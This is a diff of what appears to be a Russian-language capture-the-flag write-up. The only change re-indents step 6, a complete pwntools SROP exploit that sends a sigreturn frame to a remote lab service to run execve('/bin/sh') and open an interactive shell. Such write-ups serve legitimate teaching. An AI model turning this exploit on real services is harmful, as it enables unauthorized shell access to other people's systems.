@@ -50,29 +50,29 @@ void entry(void)
    00041019 c3              RET
    ```
 6. Пишем эксплойт по гайду и получаем такой код:
-```
-from pwn import *
-
-elf = context.binary = ELF('./task', checksec=False)
-p = remote('192.168.12.13', 1555)
-
-BINSH = elf.address + 0x1430
-POP_RAX = 0x41018
-SYSCALL_RET = 0x41015
-
-frame = SigreturnFrame()
-frame.rax = 0x3b  
-frame.rdi = BINSH          
-frame.rsi = 0x0          
-frame.rdx = 0x0           
-frame.rip = SYSCALL_RET
-
-payload = b'A' * 8
-payload += p64(POP_RAX)
-payload += p64(0xf)
-payload += p64(SYSCALL_RET)
-payload += bytes(frame)
-
-p.sendline(payload)
-p.interactive()
-```
+  ```
+  from pwn import *
+  
+  elf = context.binary = ELF('./task', checksec=False)
+  p = remote('192.168.12.13', 1555)
+  
+  BINSH = elf.address + 0x1430
+  POP_RAX = 0x41018
+  SYSCALL_RET = 0x41015
+  
+  frame = SigreturnFrame()
+  frame.rax = 0x3b  
+  frame.rdi = BINSH          
+  frame.rsi = 0x0          
+  frame.rdx = 0x0           
+  frame.rip = SYSCALL_RET
+  
+  payload = b'A' * 8
+  payload += p64(POP_RAX)
+  payload += p64(0xf)
+  payload += p64(SYSCALL_RET)
+  payload += bytes(frame)
+  
+  p.sendline(payload)
+  p.interactive()
+  ```
